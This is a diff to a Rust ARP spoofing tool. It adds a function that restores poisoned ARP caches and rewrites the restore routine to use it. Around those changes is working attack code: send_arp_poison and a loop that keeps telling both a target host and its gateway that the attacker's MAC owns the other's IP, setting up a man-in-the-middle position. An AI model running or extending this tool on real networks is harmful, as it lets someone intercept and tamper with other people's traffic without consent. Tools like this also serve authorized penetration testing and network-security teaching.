@@ -71,10 +71,10 @@ impl ArpSpoofer {
         println!("[+] Target MAC: {}", self.target_mac.unwrap());
 
         println!("[*] Looking for gateway: {}", self.gateway_ip);
-        self.gateway_mac =
-            Some(self.get_mac_address(self.gateway_ip).ok_or_else(|| {
-                format!("Could not find MAC for gateway IP: {}", self.gateway_ip)
-            })?);
+        self.gateway_mac = Some(
+            self.get_mac_address(self.gateway_ip)
+                .ok_or_else(|| format!("Could not find MAC for gateway IP: {}", self.gateway_ip))?,
+        );
         println!("[+] Gateway MAC: {}", self.gateway_mac.unwrap());
 
         Ok(())
@@ -102,13 +102,11 @@ impl ArpSpoofer {
             arp_packet.set_target_proto_addr(ip);
         }
 
-        // send_to returns Option<Result<(), Error>>, so handle properly
         match sender.send_to(&buffer, None) {
-            Some(Ok(())) => {} // Successfully sent
-            _ => return None,  // Failed to send
+            Some(Ok(())) => {}
+            _ => return None,
         }
 
-        // Listen for ARP reply
         let mut receiver = match datalink::channel(&self.interface, Default::default()) {
             Ok(Channel::Ethernet(_, rx)) => rx,
             _ => return None,
@@ -131,6 +129,8 @@ impl ArpSpoofer {
         None
     }
 
+    /// Send a spoofed ARP reply: tell `target` that `spoof_ip` belongs to `self.attacker_mac`.
+    /// Used during active poisoning.
     fn send_arp_poison(
         &self,
         target_ip: Ipv4Addr,
@@ -158,11 +158,47 @@ impl ArpSpoofer {
             arp_packet.set_target_proto_addr(target_ip);
         }
 
-        // Handle Option<Result<>> properly
         match sender.send_to(&buffer, None) {
             Some(Ok(())) => Ok(()),
             Some(Err(e)) => Err(format!("Failed to send ARP packet: {}", e)),
             None => Err("Failed to send ARP packet: unknown error".to_string()),
+        }
+    }
+
+    /// Send a corrective ARP reply: tell `target` that `spoof_ip` is at `real_mac`.
+    /// Used during restore so the victim caches the *true* owner, not the attacker.
+    fn send_arp_restore(
+        &self,
+        target_ip: Ipv4Addr,
+        target_mac: MacAddr,
+        spoof_ip: Ipv4Addr,
+        real_mac: MacAddr,
+    ) -> Result<(), String> {
+        let mut sender = self.create_channel()?;
+
+        let mut buffer = [0u8; 42];
+        {
+            let mut eth_packet = MutableEthernetPacket::new(&mut buffer).unwrap();
+            eth_packet.set_destination(target_mac);
+            eth_packet.set_source(real_mac);
+            eth_packet.set_ethertype(EtherTypes::Arp);
+
+            let mut arp_packet = MutableArpPacket::new(eth_packet.payload_mut()).unwrap();
+            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
+            arp_packet.set_protocol_type(EtherTypes::Ipv4);
+            arp_packet.set_hw_addr_len(6);
+            arp_packet.set_proto_addr_len(4);
+            arp_packet.set_operation(ArpOperations::Reply);
+            arp_packet.set_sender_hw_addr(real_mac); // <-- real owner, not attacker
+            arp_packet.set_sender_proto_addr(spoof_ip);
+            arp_packet.set_target_hw_addr(target_mac);
+            arp_packet.set_target_proto_addr(target_ip);
+        }
+
+        match sender.send_to(&buffer, None) {
+            Some(Ok(())) => Ok(()),
+            Some(Err(e)) => Err(format!("Failed to send restore ARP: {}", e)),
+            None => Err("Failed to send restore ARP: unknown error".to_string()),
         }
     }
 
@@ -177,7 +213,7 @@ impl ArpSpoofer {
         );
         println!("[*] Press Ctrl+C to stop\n");
 
-        let mut count = 0;
+        let mut count = 0u64;
         loop {
             self.send_arp_poison(self.target_ip, target_mac, self.gateway_ip)?;
             self.send_arp_poison(self.gateway_ip, gateway_mac, self.target_ip)?;
@@ -191,27 +227,45 @@ impl ArpSpoofer {
         }
     }
 
+    /// Restore both victims' ARP caches to the true MAC addresses.
+    /// Must be called explicitly before exit (Drop won't run after std::process::exit).
     pub fn restore(&self) -> Result<(), String> {
         println!("\n[*] Restoring ARP tables...");
 
         if let (Some(target_mac), Some(gateway_mac)) = (self.target_mac, self.gateway_mac) {
+            // Tell target: gateway_ip is at gateway_mac (not attacker_mac)
             for _ in 0..5 {
-                self.send_arp_poison(self.target_ip, target_mac, self.gateway_ip)?;
+                self.send_arp_restore(
+                    self.target_ip,
+                    target_mac,
+                    self.gateway_ip,
+                    gateway_mac,
+                )?;
                 thread::sleep(Duration::from_millis(100));
             }
             println!("[+] Restored target's ARP table");
 
+            // Tell gateway: target_ip is at target_mac (not attacker_mac)
             for _ in 0..5 {
-                self.send_arp_poison(self.gateway_ip, gateway_mac, self.target_ip)?;
+                self.send_arp_restore(
+                    self.gateway_ip,
+                    gateway_mac,
+                    self.target_ip,
+                    target_mac,
+                )?;
                 thread::sleep(Duration::from_millis(100));
             }
             println!("[+] Restored gateway's ARP table");
+        } else {
+            println!("[!] MACs not discovered — nothing to restore");
         }
 
         Ok(())
     }
 }
 
+/// Best-effort restore on drop (e.g. normal scope exit).
+/// Note: Drop does NOT run after std::process::exit() — call restore() explicitly there.
 impl Drop for ArpSpoofer {
     fn drop(&mut self) {
         if let Err(e) = self.restore() {
